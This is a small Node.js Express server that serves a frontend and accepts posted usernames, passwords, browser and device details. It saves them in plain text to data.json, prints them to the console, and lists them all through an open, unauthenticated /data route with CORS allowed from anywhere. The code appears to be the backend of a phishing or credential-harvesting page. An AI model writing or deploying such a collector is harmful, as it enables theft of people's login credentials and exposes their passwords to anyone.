const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

app.use(cors());
app.use(express.json());

// Serve frontend from /public
app.use(express.static("public"));

let devices = [];

// Load existing data safely
if (fs.existsSync("data.json")) {
    try {
        const data = fs.readFileSync("data.json", "utf8");
        if (data) {
            devices = JSON.parse(data);
        }
    } catch (err) {
        devices = [];
    }
}

app.post("/save", (req, res) => {

    const { username, password, time, browser, device } = req.body;

    const newEntry = {
        username,
        password,
        time,
        browser,
        device
    };

    devices.push(newEntry);

    // Save to file
    fs.writeFileSync("data.json", JSON.stringify(devices, null, 2));

    console.log("Saved:", newEntry);

    res.json({ success: true });

});


// 👇 NEW ROUTE TO VIEW DATA
app.get("/data", (req, res) => {
    res.json(devices);
});


// Render requires dynamic port
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});